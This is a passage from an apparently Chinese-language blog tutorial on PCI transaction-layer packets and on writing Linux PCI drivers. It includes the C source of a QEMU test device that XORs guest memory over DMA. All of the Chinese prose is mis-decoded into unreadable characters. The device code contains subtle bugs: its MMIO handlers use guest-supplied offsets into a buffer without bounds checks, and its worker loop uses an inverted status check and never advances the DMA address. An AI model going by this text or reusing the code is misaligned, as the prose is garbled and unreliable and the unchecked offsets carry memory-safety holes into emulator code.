alt="image.png"></p><p><img src="https://s2.loli.net/2022/08/31/EXghx6vUV8S1tdN.png" alt="image.png"></p><p>å…¶ç»“æ„å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p><p><img src="https://s2.loli.net/2022/08/31/a1IuvYtj72lS63K.png" alt="image.png"></p><h2 id="å…«ã€Transaction-Layer-Package"><a href="#å…«ã€Transaction-Layer-Package" class="headerlink" title="å…«ã€Transaction Layer Package"></a>å…«ã€Transaction Layer Package</h2><p>ä¸Šä¸€èŠ‚æˆ‘ä»¬æåˆ°äº†ä¸€ä¸ªè¯å« <code>TLP</code>ï¼Œè¿™ä¸€èŠ‚æˆ‘ä»¬ç®€è¦ä»‹ç»ä¸€ä¸‹è¿™æ˜¯ä¸€ä¸ªä»€ä¹ˆä¸œè¥¿</p><p>æˆ‘ä»¬é¦–å…ˆéœ€è¦ä»‹ç» PCI è®¾å¤‡åº•å±‚çš„é€šä¿¡ç»“æ„ï¼Œç±»ä¼¼äºè®¡ç½‘çš„ OSI ä¸ƒå±‚æ¨¡å‹ï¼ŒPCI æ€»çº¿ä¹Ÿå¯ä»¥ç”±ä¸‹åˆ°ä¸Šåˆ’åˆ†ä¸º <strong>ç‰©ç†å±‚ï¼ˆPhysical Layerï¼‰ã€æ•°æ®é“¾è·¯å±‚ï¼ˆData Link Layerï¼‰ã€äº‹åŠ¡å±‚ï¼ˆTransaction Layerï¼‰</strong>ï¼ŒTLP å³ <strong>Transaction Layer Package</strong>ï¼šåœ¨äº‹åŠ¡å±‚è¿›è¡Œä¼ è¾“çš„æ•°æ®åŒ…</p><p><img src="https://s2.loli.net/2022/08/31/QVYRUoA4JWbyFZD.png" alt="image.png"></p><h1 id="0x02-Linux-PCI-é©±åŠ¨ç¼–å†™ï¼ˆğŸ•Šï¼‰"><a href="#0x02-Linux-PCI-é©±åŠ¨ç¼–å†™ï¼ˆğŸ•Šï¼‰" class="headerlink" title="0x02. Linux PCI é©±åŠ¨ç¼–å†™ï¼ˆğŸ•Šï¼‰"></a>0x02. Linux PCI é©±åŠ¨ç¼–å†™ï¼ˆğŸ•Šï¼‰</h1><p>æœ‰çš„æ—¶å€™ä½ å¯èƒ½è‡ªå·±æ‰‹å·¥ç³Šäº†ä¸€ä¸ª PCI è®¾å¤‡ï¼ˆï¼Ÿï¼‰ï¼Œä¸‡åˆ†æ¬¢å–œåœ°æƒ³è¦ç›´æ¥å¾€è‡ªå®¶ğŸ’»çš„ PCI æ’æ§½ä¸Šä¸€æ’å°±å¼€ç”¨äº†ï¼Œä½†æ˜¯çªç„¶å‘ç°<strong>å¹¶æ²¡æœ‰ä¸€ç§ä¸‡èƒ½çš„ PCI é©±åŠ¨èƒ½å¤Ÿç›´æ¥é€‚é…ä½ è‡ªå·±é€ çš„ PCI è®¾å¤‡</strong>ï¼Œé‚£è¿™ä¸ªæ—¶å€™æˆ‘ä»¬åªå¥½è‡ªå·±åŠ¨æ‰‹å†™ä¸€ä¸ªé©±åŠ¨äº†ï¼šï¼‰</p><h2 id="ã€‡ã€QEMU-PCI-è®¾å¤‡æ¨¡æ‹Ÿ"><a href="#ã€‡ã€QEMU-PCI-è®¾å¤‡æ¨¡æ‹Ÿ" class="headerlink" title="ã€‡ã€QEMU PCI è®¾å¤‡æ¨¡æ‹Ÿ"></a>ã€‡ã€QEMU PCI è®¾å¤‡æ¨¡æ‹Ÿ</h2><p>å› ä¸ºç¬”è€…ç¡®å®æ²¡æœ‰æ¡ä»¶æ‰‹æ“ä¸€ä¸ª PCI è®¾å¤‡ï¼Œæ‰€ä»¥è¿™é‡Œåªå¥½ç”¨ QEMU æ¥æ¨¡æ‹Ÿä¸€ä¸ªï¼Œç¬”è€…è¿™é‡Œå®ç°äº†ä¸€ä¸ªé€šè¿‡ DMA æä¾›ç®€å•çš„æ•°æ®å¼‚æˆ–åŠŸèƒ½çš„ PCI è®¾å¤‡</p><blockquote><p>å…³äºæœ€åŸºç¡€çš„ QEMU è®¾å¤‡ç¼–å†™ã€QOM ç­‰ï¼Œå‚è§<a href="https://arttnba3.cn/2022/07/15/VIRTUALIZATION-0X00-QEMU-PART-I/#0x03-%E7%AE%80%E6%98%93-QEMU-%E8%AE%BE%E5%A4%87%E7%BC%96%E5%86%99">è¿™é‡Œ</a></p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * arttnba3 PCI test device</span><br><span class="hljs-comment"> * </span><br><span class="hljs-comment"> * Copyright (c) 2022 arttnba3</span><br><span class="hljs-comment"> * Author: arttnba3 &lt;arttnba@gmail.com&gt;</span><br><span class="hljs-comment"> * </span><br><span class="hljs-comment"> * This programme is just a simple pci device,</span><br><span class="hljs-comment"> * which is cerated for my own learning about qemu.</span><br><span class="hljs-comment"> * You can modify and use it freely.</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;qemu/osdep.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;hw/pci/pci.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;hw/qdev-properties.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;qemu/event_notifier.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;qemu/module.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;sysemu/kvm.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;qom/object.h&quot;</span></span><br><br><span class="hljs-class"><span class="hljs-keyword">enum</span> &#123;</span><br>    A3DEV_STATUS_INIT = <span class="hljs-number">0</span>,<br>    A3DEV_STATUS_READY,<br>    A3DEV_STATUS_RUNNING,<br>    A3DEV_STATUS_STOPPING,<br><br>    A3DEV_STATUS_TYPES,<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">enum</span> &#123;</span><br>    A3DEV_REGS_STATUS = <span class="hljs-number">0</span>,<br>    A3DEV_REGS_INSN,<br><br>    A3DEV_REGS_TYPES,<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">enum</span> &#123;</span><br>    A3DEV_INSN_START = <span class="hljs-number">0</span>,<br>    A3DEV_INSN_STOP,<br><br>    A3DEV_INSN_TYPES,<br>&#125;;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">A3EncBufferInfo</span> &#123;</span><br>    <span class="hljs-comment">/*&lt; public &gt;*/</span><br>    <span class="hljs-type">dma_addr_t</span> addr;<br>    <span class="hljs-type">uint8_t</span> val;<br>    <span class="hljs-type">uint32_t</span> len;<br>&#125; A3EncBufferInfo;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">A3PCIDevState</span> &#123;</span><br>    <span class="hljs-comment">/*&lt; private &gt;*/</span><br>    PCIDevice parent_obj;<br><br>    <span class="hljs-comment">/*&lt; public &gt;*/</span><br>    MemoryRegion mmio;<br>    MemoryRegion pmio;<br>    <span class="hljs-type">uint64_t</span> regs[A3DEV_REGS_TYPES];<br>    A3EncBufferInfo enc_buf;<br><br>    QemuThread thread;<br>    QemuMutex lock;<br>&#125; A3PCIDevState;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">A3PCIDevClass</span> &#123;</span><br>    <span class="hljs-comment">/*&lt; private &gt;*/</span><br>    PCIDeviceClass parent;<br>&#125; A3PCIDevClass;<br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> TYPE_A3DEV_PCI <span class="hljs-string">&quot;a3dev-pci&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> A3DEV_PCI(obj) \</span><br><span class="hljs-meta">    OBJECT_CHECK(A3PCIDevState, (obj), TYPE_A3DEV_PCI)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> A3DEV_PCI_GET_CLASS(obj) \</span><br><span class="hljs-meta">    OBJECT_GET_CLASS(A3PCIDevClass, obj, TYPE_A3DEV_PCI)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> A3DEV_PCI_CLASS(klass) \</span><br><span class="hljs-meta">    OBJECT_CLASS_CHECK(A3PCIDevClass, klass, TYPE_A3DEV_PCI)</span><br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> *<span class="hljs-title function_">a3dev_worker_thread</span><span class="hljs-params">(<span class="hljs-type">void</span> *arg)</span><br>&#123;<br>    A3PCIDevState *ds = A3DEV_PCI(arg);<br>    <span class="hljs-type">uint8_t</span> cb;<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">uint32_t</span> wlen = <span class="hljs-number">0</span>; wlen &lt; ds-&gt;enc_buf.len; wlen++) &#123;<br>        <span class="hljs-keyword">if</span> (ds-&gt;regs[A3DEV_REGS_STATUS] != A3DEV_STATUS_STOPPING) &#123;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>        pci_dma_read(&amp;ds-&gt;parent_obj, ds-&gt;enc_buf.addr, &amp;cb, <span class="hljs-number">1</span>);<br>        cb ^= ds-&gt;enc_buf.val;<br>        pci_dma_write(&amp;ds-&gt;parent_obj, ds-&gt;enc_buf.addr, &amp;cb, <span class="hljs-number">1</span>);<br>    &#125;<br><br>    ds-&gt;regs[A3DEV_REGS_STATUS] = A3DEV_STATUS_READY;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">uint64_t</span><br><span class="hljs-title function_">a3dev_mmio_read</span><span class="hljs-params">(<span class="hljs-type">void</span> *opaque, hwaddr addr, <span class="hljs-type">unsigned</span> size)</span><br>&#123;<br>    A3PCIDevState *ds = A3DEV_PCI(opaque);<br><br>    <span class="hljs-keyword">return</span> *(<span class="hljs-type">uint64_t</span>*)(((<span class="hljs-type">uint8_t</span>*) &amp;ds-&gt;enc_buf) + addr);<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span><br><span class="hljs-title function_">a3dev_mmio_write</span><span class="hljs-params">(<span class="hljs-type">void</span> *opaque, hwaddr addr, <span class="hljs-type">uint64_t</span> val, <span class="hljs-type">unsigned</span> size)</span><br>&#123;<br>    A3PCIDevState *ds = A3DEV_PCI(opaque);<br><br>    <span class="hljs-keyword">if</span> (ds-&gt;regs[A3DEV_REGS_STATUS] != A3DEV_STATUS_READY) &#123;<br>        <span class="hljs-keyword">return</span> ;<br>    &#125;<br><br>    <span class="hljs-keyword">switch</span> (size) &#123;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br>        *(<span class="hljs-type">uint8_t</span>*)(((<span class="hljs-type">uint8_t</span>*) &amp;ds-&gt;enc_buf ) + addr) = val;<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<br>        *(<span class="hljs-type">uint16_t</span>*)(((<span class="hljs-type">uint8_t</span>*) &amp;ds-&gt;enc_buf ) + addr) = val;<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">4</span>:<br>        *(<span class="hljs-type">uint32_t</span>*)(((<span class="hljs-type">uint8_t</span>*) &amp;ds-&gt;enc_buf ) + addr) = val;<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">8</span>:<br>        *(<span class="hljs-type">uint64_t</span>*)(((<span class="hljs-type">uint8_t</span>*) &amp;ds-&gt;enc_buf ) + addr) = val;<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">default</span>:<br>        <span class="hljs-keyword">break</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">uint64_t</span><br><span class="hljs-title function_">a3dev_pmio_read</span><span class="hljs-params">(<span class="hljs-type">void</span> *opaque, hwaddr addr, <span class="hljs-type">unsigned</span> size)</span><br>&#123;<br>    A3PCIDevState *ds = A3DEV_PCI(opaque);<br><br>    <span class="hljs-keyword">switch</span> (addr) &#123;<br>        <span class="hljs-keyword">case</span> A3DEV_REGS_STATUS:<br>            <span class="hljs-keyword">return</span> ds-&gt;regs[A3DEV_REGS_STATUS];<br>        <span class="hljs-keyword">default</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span><br><span class="hljs-title function_">a3dev_pmio_write</span><span class="hljs-params">(<span class="hljs-type">void</span> *opaque, hwaddr addr, <span class="hljs-type">uint64_t</span> val, <span class="hljs-type">unsigned</span> size)</span><br>&#123;<br>    A3PCIDevState *ds = A3DEV_PCI(opaque);<br><br>    qemu_mutex_lock(&amp;ds-&gt;lock);<br><br>    <span class="hljs-keyword">switch</span> (addr) &#123;<br>        <span class="hljs-keyword">case</span> A3DEV_REGS_INSN:<br>            <span class="hljs-keyword">switch</span> (val) &#123;<br>            <span class="hljs-keyword">case</span> A3DEV_INSN_START:<br>                <span class="hljs-keyword">if</span> (ds-&gt;regs[A3DEV_REGS_STATUS] != A3DEV_STATUS_READY) &#123;<br>                    <span class="hljs-keyword">break</span>;<br>                &#125;<br>                ds-&gt;regs[A3DEV_REGS_STATUS] = A3DEV_STATUS_RUNNING;<br>                qemu_thread_create(&amp;ds-&gt;thread, <span class="hljs-string">&quot;a3dev-worker-thread&quot;</span>, <br>                                    a3dev_worker_thread, ds, <br>                                    QEMU_THREAD_DETACHED);<br>                <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> A3DEV_INSN_STOP:<br>                <span class="hljs-keyword">if</span> (ds-&gt;regs[A3DEV_REGS_STATUS] != A3DEV_STATUS_RUNNING) &#123;<br>                    <span class="hljs-keyword">break</span>;<br>                &#125;<br>                ds-&gt;regs[A3DEV_REGS_STATUS] = A3DEV_STATUS_STOPPING;<br>                <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">default</span>:<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">default</span>:<br>            <span class="hljs-keyword">break</span>;<br>    &#125;<br><br>    qemu_mutex_unlock(&amp;ds-&gt;lock);<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">const</span> MemoryRegionOps a3dev_mmio_ops = &#123;<br>    .read = a3dev_mmio_read,<br>    .write = a3dev_mmio_write,<br>    .endianness = DEVICE_LITTLE_ENDIAN,<br>    .valid = &#123;<br>        .max_access_size = <span class="hljs-number">4</span>,<br>        .min_access_size = <span class="hljs-number">1</span>,<br>        .unaligned = <span class="hljs-literal">true</span>,<br>    &#125;,<br>    .impl = &#123;<br>        .unaligned = <span class="hljs-literal">true</span>,<br>    &#125;,<br>&#125;;<br><br><span class="hljs-type">static</span> <span class="hljs-type">const</span> MemoryRegionOps a3dev_pmio_ops = &#123;<br>    .read = a3dev_pmio_read,<br>    .write = a3dev_pmio_write,<br>    .endianness = DEVICE_LITTLE_ENDIAN,<br>    .valid = &#123;<br>        .max_access_size = <span class="hljs-number">4</span>,<br>        .min_access_size = <span class="hljs-number">1</span>,<br>        .unaligned = <span class="hljs-literal">true</span>,<br>    &#125;,<br>    .impl = &#123;<br>        .unaligned = <span class="hljs-literal">true</span>,<br>    &#125;,<br>&#125;;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">a3dev_pci_realize</span><span class="hljs-params">(PCIDevice *pci_dev, Error **errp)</span><br>&#123;<br>    A3PCIDevState *ds = A3DEV_PCI(pci_dev);<br><br>    ds-&gt;regs[A3DEV_REGS_STATUS] = A3DEV_STATUS_INIT;<br><br>    memory_region_init_io(&amp;ds-&gt;mmio, OBJECT(ds), &amp;a3dev_mmio_ops,<br>                        pci_dev, <span class="hljs-string">&quot;a3dev-mmio&quot;</span>, <span class="hljs-keyword">sizeof</span>(ds-&gt;enc_buf));<br>    pci_register_bar(pci_dev, <span class="hljs-number">0</span>, PCI_BASE_ADDRESS_SPACE_MEMORY, &amp;ds-&gt;mmio);<br>    memory_region_init_io(&amp;ds-&gt;pmio, OBJECT(ds), &amp;a3dev_pmio_ops,<br>                        pci_dev, <span class="hljs-string">&quot;a3dev-pmio&quot;</span>, A3DEV_REGS_TYPES);<br>    pci_register_bar(pci_dev, <span class="hljs-number">1</span>, PCI_BASE_ADDRESS_SPACE_IO, &amp;ds-&gt;pmio);<br><br>    <span class="hljs-built_in">memset</span>(&amp;ds-&gt;enc_buf, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(ds-&gt;enc_buf));<br>    qemu_mutex_init(&amp;ds-&gt;lock);<br><br>    ds-&gt;regs[A3DEV_REGS_STATUS] = A3DEV_STATUS_READY;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">a3dev_instance_init</span><span class="hljs-params">(Object *obj)</span><br>&#123;<br>    <span class="hljs-comment">// do something</span><br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">a3dev_class_init</span><span class="hljs-params">(ObjectClass *oc, <span class="hljs-type">void</span> *data)</span><br>&#123;<br>    DeviceClass *dc = DEVICE_CLASS(oc);<br>    PCIDeviceClass *pci = PCI_DEVICE_CLASS(oc);<br><br>    pci-&gt;realize = a3dev_pci_realize;<br>    pci-&gt;vendor_id = PCI_VENDOR_ID_QEMU;<br>    pci-&gt;device_id = <span class="hljs-number">0x1919</span>;<br>    pci-&gt;revision = <span class="hljs-number">0x81</span>;<br>    pci-&gt;class_id = PCI_CLASS_OTHERS;<br><br>    dc-&gt;desc = <span class="hljs-string">&quot;arttnba3 test PCI device&quot;</span>;<br>    set_bit(DEVICE_CATEGORY_MISC, dc-&gt;categories);<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">const</span> TypeInfo a3dev_type_info = &#123;<br>    .name = TYPE_A3DEV_PCI,<br>    .parent = TYPE_PCI_DEVICE,<br>    .instance_init = a3dev_instance_init,<br>    .instance_size = <span class="hljs-keyword">sizeof</span>(A3PCIDevState),<br>    .class_size = <span class="hljs-keyword">sizeof</span>(A3PCIDevClass),<br>    .class_init = a3dev_class_init,<br>    .interfaces = (InterfaceInfo[]) &#123;<br>        &#123; INTERFACE_CONVENTIONAL_PCI_DEVICE &#125;,<br>        &#123; &#125;,<br>    &#125;,<br>&#125;;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">a3dev_register_types</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span> &#123;<br>    type_register_static(&amp;a3dev_type_info);<br>&#125;<br><br>type_init(a3dev_register_types);<br></code></pre></td></tr></table></figure><h2 id="ä¸€ã€kernel-è¯†åˆ«-PCI-è®¾å¤‡çš„æ–¹å¼"><a href="#ä¸€ã€kernel-è¯†åˆ«-PCI-è®¾å¤‡çš„æ–¹å¼" class="headerlink" title="ä¸€ã€kernel è¯†åˆ« PCI è®¾å¤‡çš„æ–¹å¼"></a>ä¸€ã€kernel è¯†åˆ« PCI è®¾å¤‡çš„æ–¹å¼</h2><h3 id="I-åŸºæœ¬ç»“æ„"><a href="#I-åŸºæœ¬ç»“æ„" class="headerlink" title="I.åŸºæœ¬ç»“æ„"></a>I.åŸºæœ¬ç»“æ„</h3><p>æˆ‘ä»¬é¦–å…ˆæ¥çœ‹ Linux kernel ä¸­çš„é€šç”¨è®¾å¤‡é©±åŠ¨æ¨¡å‹ï¼Œä¸»è¦ç”±ä¸‰éƒ¨åˆ†ç»„æˆï¼š<strong>æ€»çº¿ï¼ˆbusï¼‰ã€è®¾å¤‡ï¼ˆdeviceï¼‰ã€é©±åŠ¨ï¼ˆdriverï¼‰</strong>ï¼Œå…·ä½“çš„æ€»çº¿ç±»å‹éƒ½æ˜¯åŸºäºè¿™ä¸€å¥—æœºåˆ¶å»å®ç°çš„</p><p><img src="https://s2.loli.net/2022/09/01/ypQ8KYmIzbZkaUd.png" alt="å·çš„å›¾"></p><p>å¯¹äº PCI è€Œè¨€ï¼Œæ€»çº¿ä¸­çš„å„ä¸ªç»„ä»¶åœ¨ Linux kernel ä¸­å¯¹åº”çš„ç»“æ„ä½“å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p><p><img src="https://s2.loli.net/2022/09/01/JtUKnCN7d1BWpxz.png" alt="å·çš„å›¾"></p><p>ä¸‹é¢æ˜¯ä¸€å¼ æ›´åŠ è¯¦ç»†çš„å±•å¼€å›¾ï¼š</p><p><img src="https://s2.loli.net/2022/09/01/y5if1YWOesXJbT3.png" alt="å·çš„å›¾"></p><p>ä¸Šé¢çš„å›¾åªç”»å‡ºäº† PCI çš„æ€»çº¿ï¼ˆ<code>struct pci_bus</code>ï¼‰ä¸ PCI è®¾å¤‡ï¼ˆ<code>struct pci_dev</code>ï¼‰ï¼Œè¿˜å°‘äº†ä¸€ä¸ªé©±åŠ¨ç»“æ„ï¼Œåœ¨å†…æ ¸ä¸­ PCI é©±åŠ¨å¯¹åº”çš„å®é™…ä¸Šæ˜¯ <code>pci_driver</code> ç»“æ„ä½“ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pci_driver</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span><span class="hljs-title">node</span>;</span><br><span class="hljs-type">const</span> <span class="hljs-type">char</span>*name;<br><span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pci_device_id</span> *<span class="hljs-title">id_table</span>;</span><span class="hljs-comment">/* Must be non-NULL for probe to be called */</span><br><span class="hljs-type">int</span>  (*probe)(<span class="hljs-keyword">struct</span> pci_dev *dev, <span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> pci_device_id *id);<span class="hljs-comment">/* New device inserted */</span><br><span class="hljs-type">void</span> (*remove)(<span class="hljs-keyword">struct</span> pci_dev *dev);<span class="hljs-comment">/* Device removed (NULL if not a hot-plug capable driver) */</span><br><span class="hljs-type">int</span>  (*suspend)(<span class="hljs-keyword">struct</span> pci_dev *dev, <span class="hljs-type">pm_message_t</span> state);<span class="hljs-comment">/* Device suspended */</span><br><span class="hljs-type">int</span>  (*resume)(<span class="hljs-keyword">struct</span> pci_dev *dev);<span class="hljs-comment">/* Device woken up */</span><br><span class="hljs-type">void</span> (*shutdown)(<span class="hljs-keyword">struct</span> pci_dev *dev);<br><span class="hljs-type">int</span>  (*sriov_configure)(<span class="hljs-keyword">struct</span> pci_dev *dev, <span class="hljs-type">int</span> num_vfs); <span class="hljs-comment">/* On PF */</span><br><span class="hljs-type">int</span>  (*sriov_set_msix_vec_count)(<span class="hljs-keyword">struct</span> pci_dev *vf, <span class="hljs-type">int</span> msix_vec_count); <span class="hljs-comment">/* On PF */</span><br>u32  (*sriov_get_vf_total_msix)(<span class="hljs-keyword">struct</span> pci_dev *pf);<br><span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pci_error_handlers</span> *<span class="hljs-title">err_handler</span>;</span><br><span class="hljs-type">const</span> <span class="hljs-class"><span 